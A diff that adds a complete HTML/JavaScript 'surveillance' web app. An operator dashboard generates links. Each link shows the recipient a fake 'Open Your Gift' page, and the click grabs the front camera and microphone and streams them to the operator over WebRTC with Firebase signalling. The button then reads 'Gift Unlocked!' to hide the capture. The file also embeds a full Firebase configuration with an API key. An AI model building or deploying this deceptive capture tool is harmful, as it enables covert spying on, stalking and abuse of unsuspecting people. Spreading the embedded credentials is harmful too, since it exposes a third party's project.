@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Surveillance Pro - Multi-Node</title>
+    <style>
+        :root { --bg: #0d0d0f; --panel: #1a1a1e; --accent: #00e5ff; --red: #ff3d00; --text: #f0f0f0; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Sidebar */
+        .sidebar { width: 300px; background: var(--panel); border-right: 1px solid #2d2d33; padding: 20px; display: flex; flex-direction: column; }
+        .gen-box { background: #000; padding: 15px; border-radius: 10px; border: 1px solid #333; margin-bottom: 20px; }
+        input { width: 100%; background: #222; border: 1px solid #444; color: #fff; padding: 10px; margin-top: 10px; font-size: 11px; border-radius: 4px; box-sizing: border-box; }
+        button { background: var(--accent); color: #000; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; font-weight: 700; margin-top: 10px; transition: 0.2s; }
+        button:hover { opacity: 0.8; }
+        
+        /* Dashboard */
+        .dashboard { flex-grow: 1; padding: 20px; overflow-y: auto; background: #050505; }
+        .camera-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap: 20px; }
+        .cam-slot { position: relative; background: #000; border: 2px solid #222; border-radius: 12px; overflow: hidden; aspect-ratio: 16/9; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .cam-slot.active { border-color: var(--accent); }
+        video { width: 100%; height: 100%; object-fit: cover; }
+
+        /* Overlays */
+        .cam-header { position: absolute; top: 10px; left: 10px; display: flex; gap: 8px; z-index: 10; }
+        .tag { background: rgba(0,0,0,0.7); padding: 4px 10px; font-size: 10px; border-radius: 4px; border: 1px solid #444; }
+        .sync-btn { position: absolute; bottom: 10px; right: 10px; background: rgba(0,229,255,0.2); color: var(--accent); border: 1px solid var(--accent); padding: 4px 12px; font-size: 10px; border-radius: 4px; cursor: pointer; pointer-events: auto; }
+
+        /* Gift UI */
+        #giftUI { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #ffffff; color: #000; position: fixed; z-index: 9999; }
+        .gift-box { text-align: center; padding: 40px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
+        .big-btn { background: #ff3d00; color: #fff; border: none; padding: 20px 50px; font-size: 22px; border-radius: 50px; cursor: pointer; font-weight: bold; }
+        
+        .hidden { display: none !important; }
+        .live-dot { color: var(--red); animation: blink 1s infinite; margin-right: 5px; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+    </style>
+</head>
+<body>
+
+    <div id="giftUI" class="hidden">
+        <div class="gift-box">
+            <h1 style="font-size: 40px;">🎁</h1>
+            <h2>You have a surprise!</h2>
+            <p>A friend sent you a special gift.</p>
+            <button class="big-btn" onclick="activateCamera()">Open Your Gift</button>
+        </div>
+    </div>
+
+    <div class="sidebar" id="sideNav">
+        <h2 style="color: var(--accent); letter-spacing: 1px;">SURVEILLANCE CMD</h2>
+        <div class="gen-box">
+            <button onclick="generateLink()">➕ NEW CAMERA NODE</button>
+            <input type="text" id="linkOutput" readonly placeholder="Link will appear here...">
+        </div>
+        <div id="log" style="flex-grow: 1; background: #000; padding: 10px; font-family: monospace; font-size: 11px; color: #00ff41; border: 1px solid #222; overflow-y: auto;">
+            [SYSTEM] Monitoring Online...
+        </div>
+    </div>
+
+    <div class="dashboard" id="mainDash">
+        <div class="camera-grid" id="camGrid"></div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, set, onValue, onChildAdded, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // ⚠️ YOUR FIREBASE CONFIG
+        const firebaseConfig = {
+  apiKey: "AIzaSyDdy2_v-_kTBaW1OwH6PYb-OJ0E9G25qK8",
+  authDomain: "sai-chiropractic-upachar.firebaseapp.com",
+  databaseURL: "https://sai-chiropractic-upachar-default-rtdb.firebaseio.com",
+  projectId: "sai-chiropractic-upachar",
+  storageBucket: "sai-chiropractic-upachar.firebasestorage.app",
+  messagingSenderId: "25917087328",
+  appId: "1:25917087328:web:372a15797238e79b3aed05"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        const urlParams = new URLSearchParams(window.location.search);
+        const role = urlParams.get('role');
+        const roomID = urlParams.get('room');
+        const connections = {};
+
+        function sysLog(m) { 
+            const lb = document.getElementById('log');
+            lb.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${m}`; 
+            lb.scrollTop = lb.scrollHeight; 
+        }
+
+        // --- CAMERA SIDE ---
+        if (role === 'camera') {
+            document.getElementById('giftUI').classList.remove('hidden');
+            document.getElementById('sideNav').classList.add('hidden');
+            document.getElementById('mainDash').classList.add('hidden');
+
+            window.activateCamera = async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
+                    
+                    stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) push(ref(db, `rooms/${roomID}/camera/ice`), JSON.stringify(e.candidate));
+                    };
+
+                    const offer = await pc.createOffer();
+                    await pc.setLocalDescription(offer);
+                    set(ref(db, `rooms/${roomID}/camera/offer`), JSON.stringify(offer));
+
+                    onValue(ref(db, `rooms/${roomID}/monitor/answer`), (snap) => {
+                        if (snap.val()) pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(snap.val())));
+                    });
+
+                    document.querySelector('.big-btn').innerText = "Gift Unlocked!";
+                    document.querySelector('.big-btn').style.background = "#4CAF50";
+                } catch (e) { alert("Error: " + e.message); }
+            };
+        } 
+        
+        // --- OPERATOR SIDE ---
+        else {
+            window.generateLink = () => {
+                const id = "CAM_" + Math.random().toString(36).substring(7).toUpperCase();
+                const link = `${window.location.origin}${window.location.pathname}?role=camera&room=${id}`;
+                document.getElementById('linkOutput').value = link;
+                sysLog(`Generated Node: ${id}`);
+            };
+
+            // Watch for any new "room" created in Firebase
+            onChildAdded(ref(db, 'rooms'), (snapshot) => {
+                const id = snapshot.key;
+                if (!connections[id]) {
+                    createCamUI(id);
+                    startMonitoring(id);
+                }
+            });
+        }
+
+        function createCamUI(id) {
+            const grid = document.getElementById('camGrid');
+            const html = `
+                <div class="cam-slot" id="slot_${id}">
+                    <div class="cam-header">
+                        <div class="tag">${id}</div>
+                        <div class="tag" style="color:#00ff00"><span class="live-dot">●</span>LIVE</div>
+                    </div>
+                    <video id="video_${id}" autoplay playsinline muted></video>
+                    <button class="sync-btn" onclick="document.getElementById('video_${id}').play()">SYNC FEED</button>
+                </div>`;
+            grid.insertAdjacentHTML('beforeend', html);
+        }
+
+        async function startMonitoring(id) {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }, { urls: "stun:stun1.l.google.com:19302" }] });
+            connections[id] = pc;
+
+            pc.ontrack = (e) => {
+                const v = document.getElementById(`video_${id}`);
+                v.srcObject = e.streams[0];
+                sysLog(`Receiving stream from ${id}...`);
+                document.getElementById(`slot_${id}`).classList.add('active');
+            };
+
+            onValue(ref(db, `rooms/${id}/camera/offer`), async (snap) => {
+                const data = snap.val();
+                if (data && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(data)));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+                    set(ref(db, `rooms/${id}/monitor/answer`), JSON.stringify(answer));
+                    sysLog(`Handshake complete for ${id}`);
+                }
+            });
+
+            onChildAdded(ref(db, `rooms/${id}/camera/ice`), (snap) => {
+                const data = snap.val();
+                if (data) pc.addIceCandidate(new RTCIceCandidate(JSON.parse(data))).catch(() => {});
+            });
+        }
+    </script>
+</body>
+</html>
